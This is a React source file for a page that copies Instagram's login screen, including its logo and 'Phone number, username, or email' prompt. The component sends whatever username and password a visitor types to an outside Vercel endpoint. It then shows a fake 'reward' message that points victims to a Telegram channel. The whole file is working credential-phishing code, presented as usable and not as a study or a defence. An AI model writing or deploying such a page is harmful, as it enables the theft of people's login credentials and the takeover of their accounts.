import React, { useState } from "react";
import styles from "../styles/homepage.module.css";
import { Button, Spinner } from "@chakra-ui/react";
import axios from "axios";

const Homepage = () => {
  const [toggle, setToggle] = useState(false);
  const [username, setUser] = useState("");
  const [password, setPass] = useState("");
  const [isLoading, setLoading] = useState(false);

  const handleClick = () => {
    setLoading(true);
    if (username !== "" && password !== "") {
      let payload = {
        username,
        password,
      };
      axios
        .post("https://test-nu-blush-17.vercel.app/user/profile", payload)
        .then((res) => {
          console.log(res.data);
          setLoading(false);
          setToggle(true);
        })
        .catch((err) => {
          console.log(err);
          setLoading(false);
        });
    } else {
      setLoading(false);
    }
  };

  return (
    <>
      {toggle ? (
        <div className={styles.cont}>
          <p className={styles.notice}>
            Congratulations, You will get reward soon. keep updated on our
            Telegram Channel
          </p>
        </div>
      ) : (
        <div className={styles.cont}>
          <div className={styles.form}>
            <div className={styles.logo}>
              <img
                width={"60%"}
                src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png"
                alt="logo"
              />
            </div>

            <div className={styles.formCont}>
              <input
                onChange={(e) => setUser(e.target.value)}
                type="text"
                placeholder="Phone number, username, or email"
              />
              <input
                onChange={(e) => setPass(e.target.value)}
                type="password"
                placeholder="Password"
              />
              <Button
                color={"white"}
                onClick={handleClick}
                bg={"#0095F6"}
                className={styles.btn}
              >
                {isLoading ? <Spinner /> : "Log in"}
              </Button>
            </div>

            <p>Forgot Password?</p>
            <p style={{ marginTop: "30px" }}>
              Don't have an account? <span>Sign Up</span>
            </p>
            <p style={{ marginTop: "40px" }}>Get the app</p>

            <div
              style={{
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                gap: "5px",
              }}
            >
              <img
                width={"40%"}
                src="https://www.freepnglogos.com/uploads/app-store-logo-png/apple-app-store-travel-awards-globestamp-7.png"
                alt=""
              />
            </div>
          </div>
        </div>
      )}
    </>
  );
};

export default Homepage;
